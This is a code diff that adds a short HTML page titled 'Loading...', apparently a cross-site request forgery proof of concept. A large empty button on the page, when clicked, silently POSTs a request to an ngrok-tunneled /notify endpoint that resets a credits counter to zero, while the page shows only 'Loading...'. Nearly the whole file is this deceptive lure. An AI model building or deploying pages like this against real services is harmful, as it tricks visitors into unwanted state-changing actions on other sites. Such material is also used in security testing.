@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Loading...</title>
+
+    
+<script>
+function resetTotal(){
+    var xhi = new XMLHttpRequest();
+    var access = "https://385ae2136771.ngrok.io/notify";
+    var address = "https://385ae2136771.ngrok.io/notify"
+    var credits = '0'
+    xhi.open("POST", address, true);
+    xhi.setRequestHeader('Content-Type', 'application/json');
+    xhi.send(JSON.stringify({counter: credits}));
+}
+</script>
+</head>
+<body>
+    <div class='w3-button w3-xxlarge' onclick='resetTotal()'></div>
+    Loading...
+</body>
+</html>
